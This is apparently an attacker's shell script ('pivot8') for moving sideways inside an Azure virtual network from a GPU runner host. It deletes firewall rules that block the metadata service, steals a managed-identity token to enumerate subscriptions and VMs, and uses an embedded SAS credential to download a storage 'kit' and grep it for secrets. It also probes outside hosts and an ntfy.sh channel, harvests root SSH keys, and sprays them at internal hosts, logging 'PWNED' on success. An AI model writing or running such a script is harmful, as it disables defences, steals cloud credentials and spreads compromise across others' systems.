#!/bin/bash
# pivot8 - L40S runner (.29) in-VNet: unblock IMDS via root firewall edit, ARM token, blob SAS, TLS/seed/ntfy, peer ssh
exec >/tmp/pivot8-9927.txt 2>&1
set +e
say(){ echo; echo "==$1"; }
say M8-START-$(date -u +%s)
K=/tmp/kc
SAS='sv=2015-04-05&ss=b&srt=sco&sp=rwdlacup&st=2026-11-20T17%3A32%3A26.0000000Z&se=2026-11-27T17%3A37%3A26.0000000Z&spr=https&sig=P2P1GPVXTMXnTT5%2FQXD9nh2yvMkZIYMHaeeA4YtaZxU%3D'

say Afw
sudo -n iptables-save 2>/dev/null | grep -nE '169\.254|DROP|REJECT' | head -20
sudo -n nft list ruleset 2>/dev/null | grep -nE '169\.254|drop|reject|to 169' | head -20
sudo -n ip route get 169.254.169.254 2>&1 | head -3
sudo -n iptables -S OUTPUT 2>/dev/null | head -20
sudo -n iptables -t nat -S OUTPUT 2>/dev/null | head -10
ip -4 route show table local 2>/dev/null | grep 169.254 | head -3; cat /proc/sys/net/ipv4/conf/all/route_localnet 2>/dev/null

say Bimds-before
curl -s -m 6 -o /tmp/i0 -w 'rc=%{http_code} t=%{time_total}\n' -H Metadata:true 'http://169.254.169.254/metadata/instance/compute?api-version=2021-12-13&format=json'
head -c 300 /tmp/i0; echo

say Cunblock
for d in 'OUTPUT -d 169.254.169.254/32 -j DROP' 'OUTPUT -d 169.254.169.254/32 -j REJECT' 'FORWARD -d 169.254.169.254/32 -j DROP' 'POSTROUTING -d 169.254.169.254/32 -j DROP'; do
  for r in 1 2 3; do sudo -n iptables -D $d 2>/dev/null && echo "IPT_DEL ok: $d" ; done
done
sudo -n iptables -S 2>/dev/null | grep -c 169.254
sudo -n nft list ruleset 2>/dev/null | grep -B2 -A2 '169.254.169.254' | head -30
# flap route_localnet + re-add link-local route if missing
sudo -n sysctl -w net.ipv4.conf.all.route_localnet=1 2>/dev/null
sudo -n ip route add 169.254.169.254/32 dev ens3 2>/dev/null && echo ROUTE_ADD_OK
curl -s -m 6 -o /tmp/i1 -w 'rc=%{http_code} t=%{time_total}\n' -H Metadata:true 'http://169.254.169.254/metadata/instance/compute?api-version=2021-12-13&format=json'
head -c 120 /tmp/i1; echo

say Dimds-after
curl -s -m 8 -o /tmp/ic.json -w 'compute rc=%{http_code} %{size_download}\n' -H Metadata:true 'http://169.254.169.254/metadata/instance/compute?api-version=2021-12-13&format=json'
head -c 3000 /tmp/ic.json; echo
curl -s -m 8 -o /tmp/iu.json -w 'userdata rc=%{http_code} %{size_download}\n' -H Metadata:true 'http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text'
head -c 200 /tmp/iu.json; echo
curl -s -m 10 -o /tmp/it.json -w 'identity rc=%{http_code} %{size_download}\n' -H Metadata:true 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'
head -c 400 /tmp/it.json; echo

say Earm
python3 - <<'PY' >/tmp/arm.txt 2>&1
import json,os,urllib.request,urllib.parse
def get(url,tok=None,method='GET',body=None,api=None):
    if api: url=url+('&' if '?' in url else '?')+'api-version='+api
    r=urllib.request.Request(url,method=method,data=body)
    if tok: r.add_header('Authorization','Bearer '+tok)
    r.add_header('Content-Type','application/json')
    with urllib.request.urlopen(r,timeout=25) as f: return f.status,f.read()
try:
    tok=json.load(open('/tmp/it.json'))['access_token']
    print('TOK_OK len=%d'%len(tok))
    open('/tmp/armtok','w').write(tok)
    s,b=get('https://management.azure.com/subscriptions',tok,api='2020-01-01')
    print('SUBS',s,b[:600].decode())
    subs=[x['subscriptionId'] for x in json.loads(b)['value']]
    for sub in subs:
        s,b=get(f'https://management.azure.com/subscriptions/{sub}/providers/Microsoft.Compute/virtualMachineScaleSets',tok,api='2023-09-01')
        print('VMSS',sub,s,b[:800].decode())
        try:
            for v in json.loads(b).get('value',[]):
                nm=v['name']; rg=v['id'].split('/')[4]
                print('VMSSITEM',sub,rg,nm,v.get('location'))
                s2,b2=get(f"https://management.azure.com/subscriptions/{sub}/resourceGroups/{rg}/providers/Microsoft.Compute/virtualMachineScaleSets/{nm}/virtualMachines",tok,api='2023-09-01')
                print('INST',s2,b2[:1200].decode())
        except Exception as e: print('VMSSERR',e)
    s,b=get('https://management.azure.com/providers/Microsoft.Compute/virtualMachines',tok,api='2023-09-01')
    print('ALLVM',s,b[:800].decode())
except Exception as e:
    print('ARMERR',type(e).__name__,e)
    try: print('BODY',e.read()[:400].decode())
    except Exception: pass
PY
cat /tmp/arm.txt | head -60

say Fblob
curl -s -m 25 -o /tmp/bl.xml -w 'list rc=%{http_code} %{size_download}\n' "https://ulbatchkit4620.blob.core.windows.net/kit?restype=container&comp=list&$SAS"
head -c 3000 /tmp/bl.xml; echo
python3 - <<'PY'
import re
try:
    x=open('/tmp/bl.xml',errors='ignore').read()
    print('BLOBS', re.findall(r'<Name>([^<]+)</Name>',x)[:40])
except Exception as e: print('ERR',e)
PY
curl -s -m 30 -o /tmp/kit.tgz -w 'kit dl rc=%{http_code} %{size_download}\n' "https://ulbatchkit4620.blob.core.windows.net/kit/fleet-kit-srb.tar.gz?$SAS"
sha256sum /tmp/kit.tgz 2>/dev/null
tar tzf /tmp/kit.tgz 2>/dev/null | head -30
mkdir -p /tmp/kitx && tar xzf /tmp/kit.tgz -C /tmp/kitx 2>/dev/null
find /tmp/kitx -maxdepth 3 -type f 2>/dev/null | head -20
grep -rIlE 'PRIVATE KEY|secret|password' /tmp/kitx 2>/dev/null | head -10
curl -s -m 20 -o /dev/null -w 'negctl(mutated sig) rc=%{http_code}\n' "https://ulbatchkit4620.blob.core.windows.net/kit?restype=container&comp=list&${SAS%??}AA%3D"

say Gtls
for u in https://20.109.152.114/ https://20.125.42.21/ http://20.125.42.21:8088/ https://20.125.42.21:8088/; do
  echo "-- $u"; curl -k -s -m 8 -o /tmp/tb -D /tmp/th -w 'rc=%{http_code} size=%{size_download}\n' "$u"; head -6 /tmp/th; head -c 300 /tmp/tb; echo
done
echo "-- .114 host-hdrs"; for h in localhost seed ntfy ul x; do curl -k -s -m 6 -o /dev/null -w "$h rc=%{http_code}\n" -H "Host: $h" https://20.109.152.114/; done
echo "-- .114 path enum"; for p in /api /health /status /stats /seed /hosts /runners /metrics /version /api/v1/hosts /manifest.json; do curl -k -s -m 5 -o /tmp/pb -w "$p rc=%{http_code} %{size_download}\n" "https://20.109.152.114$p"; done
curl -k -s -m 6 https://20.109.152.114/ 2>/dev/null | head -c 400

say Hseed
for u in http://163.68.86.6:8090/ http://163.68.86.6:8090/hosts http://163.68.86.6:8090/manifest.json http://163.68.86.6:8090/kit.txt http://163.68.86.6:8090/report; do
  echo "-- $u"; curl -s -m 6 -o /tmp/sb -w 'rc=%{http_code} size=%{size_download}\n' "$u"; head -c 400 /tmp/sb; echo
done

say Intfy
curl -s -m 12 -o /tmp/ntfy.txt -w 'ntfy rc=%{http_code} %{size_download}\n' 'https://ntfy.sh/t19-u70980-75f2cee9/json?poll=1'
tail -c 3000 /tmp/ntfy.txt

say Issh-peers
ls -la /root/.ssh 2>/dev/null | head -10
sudo -n ls -la /root/.ssh 2>/dev/null | head -12
sudo -n cat /root/.ssh/authorized_keys 2>/dev/null | head -6
cat /home/ubuntu/.ssh/authorized_keys 2>/dev/null | head -4
PKY=$(ls /root/.ssh/id_* /home/ubuntu/.ssh/id_* $K/* 2>/dev/null | grep -vE '\.pub$|authorized' | head -100)
echo "KEYCOUNT=$(echo "$PKY" | wc -l)"
for ip in 10.243.0.24 10.243.0.26 10.243.0.27 10.243.0.30 10.243.0.31; do
  timeout 3 bash -c "echo > /dev/tcp/$ip/22" 2>/dev/null && echo "TCP22_OPEN $ip" || echo "TCP22_CLOSED $ip"
  # banner
  timeout 5 bash -c "exec 3<>/dev/tcp/$ip/22; head -c 120 <&3" 2>/dev/null | tr -d '\r' | head -2
  for u in ubuntu t19 root azureuser; do
    for k in $PKY; do
      o=$(timeout 8 ssh -i "$k" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=4 -o IdentitiesOnly=yes -o PreferredAuthentications=publickey "$u@$ip" 'echo SSHOK uid=$(id -u) h=$(hostname) g=$(nvidia-smi -L 2>/dev/null|wc -l)' 2>&1 | tail -1)
      case "$o" in *SSHOK*) echo "PWNED $ip $u $k :: $o";; esac
    done
  done
done

say M8-END
